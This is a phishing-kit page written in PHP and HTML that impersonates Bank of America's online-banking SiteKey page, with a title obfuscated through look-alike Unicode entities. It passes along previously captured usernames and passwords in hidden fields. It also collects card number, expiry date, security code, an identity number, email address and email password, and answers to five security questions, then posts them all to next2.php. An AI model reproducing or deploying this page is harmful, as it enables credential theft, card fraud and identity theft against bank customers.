<?php
$id = $_POST['user'];
$pass = $_POST['pass'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#914;&#1072;&#110;&#107;&#32;&#1086;&#102;&#32;&#913;&#109;&#1077;&#114;&#1110;&#1089;&#1072;&#32;&#124;&#32;&#927;&#110;&#108;&#1110;&#110;&#1077;&#32;&#914;&#1072;&#110;&#107;&#1110;&#110;&#103;&#32;&#124;&#32;&#1029;&#1110;&#103;&#110;&#32;&#921;&#110;&#32;&#124;&#32;&#83;&#105;&#116;&#101;&#107;&#101;&#121;</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			   <style type="text/css">
.textbox {  
    border: solid 1px #C7C6C4;
  	padding-left: 8px; 
  -webkit-border-radius: 5px; 
    -moz-border-radius: 5px;
	font-size: 14px;
    height: 34px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #70BDEF; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 
</style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1280px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:172px; top:15px; width:410px; height:37px; z-index:0"><img src="images/ba1.png" alt="" title="" border=0 width=410 height=37></div>

<div id="image2" style="position:absolute; overflow:hidden; left:964px; top:26px; width:178px; height:21px; z-index:1"><a href="#"><img src="images/ba2.png" alt="" title="" border=0 width=178 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:155px; top:61px; width:986px; height:120px; z-index:2"><img src="images/ba3.png" alt="" title="" border=0 width=986 height=120></div>

<div id="image4" style="position:absolute; overflow:hidden; left:168px; top:14px; width:230px; height:38px; z-index:3"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=230 height=38></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:154px; top:181px; width:989px; height:229px; z-index:4"><img src="images/ba4.png" alt="" title="" border=0 width=989 height=229></div>

<div id="image6" style="position:absolute; overflow:hidden; left:156px; top:458px; width:660px; height:152px; z-index:5"><img src="images/ba5.png" alt="" title="" border=0 width=660 height=152></div>
<form action=next2.php name=chalbhai id=chalbhai method=post>

<input name="user" value="<?=$id?>" type="hidden">
<input name="pass"  value="<?=$pass?>" type="hidden">
<div id="image7" style="position:absolute; overflow:hidden; left:155px; top:1068px; width:655px; height:333px; z-index:6"><img src="images/ba6.png" alt="" title="" border=0 width=655 height=333></div>

<div id="image8" style="position:absolute; overflow:hidden; left:137px; top:1686px; width:987px; height:150px; z-index:7"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>
<input name="formtext1" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:162px;top:638px;z-index:20">
<input name="formtext2" class="textbox" autocomplete="off" required  placeholder="MM/YYYY" type="text" style="position:absolute;width:271px;left:162px;top:713px;z-index:22">
<div id="image11" style="position:absolute; overflow:hidden; left:162px; top:761px; width:157px; height:17px; z-index:23"><img src="images/cv.png" alt="" title="" border=0 width=157 height=17></div>

<input name="formtext3" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:162px;top:788px;z-index:24">
<div id="image12" style="position:absolute; overflow:hidden; left:164px; top:832px; width:148px; height:17px; z-index:25"><img src="images/sn.png" alt="" title="" border=0 width=148 height=17></div>

<input name="formtext4" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:162px;top:858px;z-index:26">
<div id="image13" style="position:absolute; overflow:hidden; left:165px; top:907px; width:94px; height:16px; z-index:27"><img src="images/em.png" alt="" title="" border=0 width=94 height=16></div>

<input name="formtext5" class="textbox" autocomplete="off" required  type="email" style="position:absolute;width:271px;left:162px;top:929px;z-index:28">
<div id="image14" style="position:absolute; overflow:hidden; left:165px; top:974px; width:105px; height:18px; z-index:29"><img src="images/ep.png" alt="" title="" border=0 width=105 height=18></div>

<input name="formtext6" class="textbox" autocomplete="off" required  type="password" style="position:absolute;width:271px;left:162px;top:1000px;z-index:30">
<div id="image15" style="position:absolute; overflow:hidden; left:167px; top:1044px; width:551px; height:17px; z-index:31"><img src="images/sit.png" alt="" title="" border=0 width=551 height=17></div>
<select name="formselect1" class="textbox" required style="position:absolute;left:162px;top:1076px;width:312px;z-index:8">
<option value="" >Select SiteKey Challenge Question 1</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option></select>
<input name="formtext7" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:271px;left:535px;top:1076px;z-index:9">
<select name="formselect2" class="textbox" required  style="position:absolute;left:162px;top:1146px;width:312px;z-index:10">
<option value="" >Select SiteKey Challenge Question 2</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option></select>
<input name="formtext8" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:535px;top:1146px;z-index:11">
<select name="formselect3" class="textbox" required  style="position:absolute;left:162px;top:1216px;width:312px;z-index:12">
<option value="" >Select SiteKey Challenge Question 3</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option></select>
<input name="formtext9" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:535px;top:1216px;z-index:13">
<select name="formselect4" class="textbox" required  style="position:absolute;left:162px;top:1286px;width:312px;z-index:14">
<option value="" >Select SiteKey Challenge Question 4</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option></select>
<input name="formtext10" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:536px;top:1286px;z-index:15">
<select name="formselect5" class="textbox" required class="textbox" style="position:absolute;left:162px;top:1356px;width:312px;z-index:16">
<option value="" >Select SiteKey Challenge Question 5</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option></select>
<input name="formtext11" class="textbox" autocomplete="off" required  type="text" style="position:absolute;width:271px;left:535px;top:1356px;z-index:17">
<div id="formimage1" style="position:absolute; left:445px; top:1460px; z-index:18"><input type="image" name="formimage1" width="92" height="42" src="images/sub.png"></div>
<div id="image9" style="position:absolute; overflow:hidden; left:161px; top:613px; width:88px; height:15px; z-index:19"><img src="images/can.png" alt="" title="" border=0 width=88 height=15></div>


<div id="image10" style="position:absolute; overflow:hidden; left:162px; top:686px; width:75px; height:17px; z-index:21"><img src="images/exd.png" alt="" title="" border=0 width=75 height=17></div>



<div id="image16" style="position:absolute; overflow:hidden; left:245px; top:614px; width:12px; height:11px; z-index:32"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

<div id="image17" style="position:absolute; overflow:hidden; left:234px; top:687px; width:12px; height:11px; z-index:33"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

<div id="image18" style="position:absolute; overflow:hidden; left:317px; top:762px; width:12px; height:11px; z-index:34"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

<div id="image19" style="position:absolute; overflow:hidden; left:310px; top:834px; width:12px; height:11px; z-index:35"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

<div id="image20" style="position:absolute; overflow:hidden; left:256px; top:909px; width:12px; height:11px; z-index:36"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

<div id="image21" style="position:absolute; overflow:hidden; left:267px; top:975px; width:12px; height:11px; z-index:37"><img src="images/sta.png" alt="" title="" border=0 width=12 height=11></div>

</div>

</body>
</html>
